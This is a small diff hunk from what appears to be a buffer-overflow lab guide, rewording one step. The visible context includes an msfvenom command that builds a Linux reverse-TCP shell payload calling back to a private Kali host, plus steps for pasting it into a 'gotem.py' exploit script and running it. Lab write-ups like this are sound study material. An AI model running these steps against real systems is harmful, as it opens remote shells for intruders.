@@ -161,7 +161,7 @@ Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f
 6. Replace the localhost with your Kali Machine and the bad characters that come after the -b switch
 7. Edit your gotem.py script, replace the IP and Port with the Linux Machine IP and port, and edit the command that you tested against with the vulnerable command.
 8. Delete the entire overflow section, paste the payload that you generate into this section.
-9. change the overflow variable in the shellcode = line to buf
+9. change the overflow variable in the shellcode, it should be **buf** instead
 10. Save the script! 
 11. Run the script:
 Command: python gotem.py
